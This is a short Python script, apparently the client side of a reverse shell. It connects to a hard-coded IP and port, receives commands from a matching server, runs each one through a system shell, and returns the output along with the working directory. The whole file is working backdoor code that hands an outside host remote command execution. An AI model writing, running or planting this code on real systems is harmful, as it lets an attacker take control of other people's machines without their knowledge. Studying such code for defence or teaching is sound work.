import socket
import os
import subprocess


S = socket.socket()
HOST = "192.168.235.90"
PORT = 9999  # It has to be same as the port no. in the server.py

# Connecting to the client
S.connect((HOST, PORT))


while True:
    data = S.recv(1024)  # Buffer size; amount of data to receive
    try:
        if data[:2].decode("utf-8") == "cd":
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(
                data[:].decode("utf-8"),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_string = str(output_byte, "utf-8")
            cwd = os.getcwd() + "> "
            S.send(str.encode(output_string + cwd))

            print(output_string)

    except:
        S.send(str.encode("Please check your command again..."))
